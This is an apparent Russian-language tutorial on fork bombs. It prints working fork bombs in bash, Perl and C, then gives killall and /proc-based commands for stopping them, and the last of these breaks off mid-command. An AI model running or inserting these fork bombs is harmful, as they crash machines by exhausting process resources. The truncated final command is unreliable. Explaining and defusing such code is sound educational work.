# Fork Bomb #

Концепция Fork Bomb — коварная маленькая программа, которая порождает себя n-раз. 
Действует Fork bomb по весьма простому пути: для начала программа загружает себя в память, где создает несколько копий себя самой (обычно две). Далее каждая из этих копий создает столько же копий, как и оригинал, и так далее пока память не будет полностью забита, что приводит к отказу системы, ресурсы системы быстро исчерпываются. 

Структура кода Fork bomb может состоять всего лишь из 5 строчек. 
При использовании некоторых языков для написания подобного рода вредоносного ПО исключается необходимость использовать двоеточия, круглые скобки, а порой и все буквенно-цифровые символы.

## Примеры создания  Fork Bomb в Unix/Linux ##
**ВНИМАНИЕ!!!** Эти примеры могут привести к сбою вашей виртуальной машины/компьтера в случае его выполнения.
### Примеры создания  Fork Bomb с использованием bash ###

Итак, код выглядит так:

	# :(){ :|:& };:

Где:
   *	:() — Определение функции.
   *	{  — Открытие функции.
   *	:|: — Далее, загружает копию функции «:» в память тем самым, будет вызывать само себя с использованием техники программирования ( так называемая рекурсия) и передает результат на другой вызов функции.
   *	‘:’ — Худшая часть — функция, вызываемая два раза, чтобы «бомбить» вашу систему.
   *	& — Помещает вызов функции в фоновом режиме, чтобы fork (дочерний процесс) не мог «умереть» вообще, тем самым это начнет есть системные ресурсы.
   *	} — Закрытие функции.
   *	; — Завершите определение функции. Т.е является разделителем команд, (такой как и &&).
   *	: — Запускает функцию которая порождает fork bomb().
	 
Это рабочий код, но не очень читабельный. Вот пример нормального, читаемого кода:
	 
	#!/usr/bin/env bash -x
	 bomb() {
	 bomb | bomb &
	 };
	 bomb
	 
Идем дальше.

### Примеры создания  Fork Bomb с использованием perl ###

Пример встроенной оболочки с использованием интерпретатора Perl:

	# perl -e "fork while fork" &

### Примеры создания  Fork Bomb с использованием C/C++ ###

Код будет выглядеть:
	#include <unistd.h>

	int main(void)
	{
	while(1)
	fork();
	}
	
## Примеры Defusing Fork Bomb в Unix/Linux ##

Defusing — так называемое разминирование fork bomb. Из-за их характера, такие бомбы трудно оставновить после их запуска. Чтобы остановить такую бомбу, нужно  завершить все рабочие копии, чего трудно достичь. Одна из проблем заключается в том, что данная команда не может быть выполнена из-за того, что таблица процессов полностью забита. Вторая серьезная проблема заключается в том,  на момент поиска процессов для прекрашения потратилось время за которое могло создатся еще пару форков программы.

Для удаления такой бомбы, можно использовать одну из перечисленных команд:

	# killall -STOP processWithBombName
	# killall -KILL processWithBombName
	
Когда у системы мало свободных PID (в Linux максимальное количество PID-ов можно получить получено из ``` /proc/sys/kernel/pid_max ```), «разрядка» form bomb-ы становится более сложной:

	# killall -9 processWithBombName

Можно получить ошибку:

	bash: fork: Cannot allocate memory

В этом случае разрядка бомбы возможна только в том случае, если хотя бы одна оболочка открыта. Процессы могут не разветвляться, но можно выполнить любую программу из текущей оболочки. Как правило, возможна только одна попытка.

Команда «killall -9» не выполняется непосредственно из оболочки, потому что команда не является атомарной и не удерживает блокировки в списке процессов, поэтому к тому времени когда она закончится, fork bomb наплодит еще ПИДов. Поэтому нужно запустить несколько процессов killall, например:

	# while :; do killall -9 processWithBombName; done
	
Еще пример, — т.к таблица процессов достапна в Linux через ФС (/proc), то можно обезвредить данный форк бомбы с помощью встроенных функций bash, которые не требуют развертывания новых процессов.

Следующий пример идентифицирует процессы, связанные с нарушением и приостанавливает их, чтобы предотвратить данный форк, до того момента, пока они убиты по одному за раз. Это позволяет избежать состояния гонки других примеров, которые могут потерпеть неудачу, если нарушающие процессы могут развиваться быстрее, чем они убиты:

	# cd /proc && for p in [0-9]*; do read cmd < "$p/cmdline"; if [[ $cmd = processWithBombName ]]; then kill -s 
	
Как-то так!
